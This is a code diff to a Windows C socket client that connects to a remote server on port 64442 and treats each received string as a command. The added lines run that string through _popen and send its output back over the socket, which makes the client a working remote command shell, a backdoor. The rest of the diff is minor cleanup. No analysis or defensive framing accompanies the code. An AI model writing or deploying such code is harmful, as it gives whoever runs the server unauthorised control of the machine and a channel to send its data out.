@@ -21,7 +21,6 @@ int main(int argc, char* argv[]) {
 
 	struct sockaddr_in server;
 	// set reply to 128 bytes since we shouldn't ever receive a command longer than that
-	char *message;
 	char server_reply[DEFAULT_BUFLEN];
 	int recv_size = DEFAULT_BUFLEN;
 
@@ -55,7 +54,7 @@ int main(int argc, char* argv[]) {
 	server.sin_family = AF_INET;
 
 	// htons is done to maintain the arrangement of bytes which is sent in the network(Endianness)
-	server.sin_port = htons( 64442 );
+	server.sin_port = htons(64442);
 
 	//Connect to remote server
 	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
@@ -77,6 +76,34 @@ int main(int argc, char* argv[]) {
 		//Add a NULL terminating character to make it a proper string before printing
 		server_reply[recv_size] = '\0';
 		puts(server_reply);
+
+		char   psBuffer[128];
+		FILE* pPipe;
+
+		/* Run DIR so that it writes its output to a pipe. Open this
+		 * pipe with read text attribute so that we can read it
+		 * like a text file.
+		 */
+
+		if ((pPipe = _popen(server_reply, "rt")) == NULL)
+			exit(1);
+
+		/* Read pipe until end of file, or an error occurs. */
+
+		while (fgets(psBuffer, 128, pPipe))
+		{
+			send(s, psBuffer, strlen(psBuffer), 0);
+		}
+
+		/* Close pipe and print return value of pPipe. */
+		if (feof(pPipe))
+		{
+			printf("\nProcess returned %d\n", _pclose(pPipe));
+		}
+		else
+		{
+			printf("Error: Failed to read the pipe to the end.\n");
+		}
 
 	} while (i == 1);
 
